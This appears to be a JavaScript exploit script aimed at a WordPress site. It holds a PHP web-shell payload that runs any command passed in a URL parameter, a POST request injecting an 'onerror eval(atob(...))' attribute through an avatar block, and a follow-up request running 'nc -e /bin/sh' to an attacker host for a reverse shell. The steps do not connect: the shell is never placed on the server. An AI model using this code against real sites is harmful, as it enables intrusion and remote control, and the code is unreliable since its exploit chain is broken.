<script>
// Payload: Reverse Shell
const reverseShellPayload = `<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>`;

// Function to send HTTP GET request
function sendRequest(url) {
    fetch(url)
    .then(response => response.text())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
}

// Exploit: Inject Reverse Shell Payload
const exploitUrl = 'http://target-site.com/wp-admin/admin-ajax.php?action=rest_core_controller_create_item&collection_name=avatars';
const exploitData = JSON.stringify({
    attributes: {
        size: 96,
        userId: 1,
        style: {
            border: {
                color: 'red", "type": "text/css", "onerror": "eval(atob(this.id))//'
            }
        }
    },
    content: 'Exploited!',
    blockName: 'core/avatar',
    clientId: 'exploited',
    blockVersion: 1,
    innerBlocks: []
});
fetch(exploitUrl, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: exploitData
})
.then(response => response.json())
.then(data => {
    console.log('Exploit successful:', data);
    const reverseShellUrl = `http://target-site.com/wp-content/themes/twentytwenty/header.php?cmd=${encodeURIComponent('nc -e /bin/sh attacker-ip port')}`;
    sendRequest(reverseShellUrl);
})
.catch(error => console.error('Exploit failed:', error));
</script>
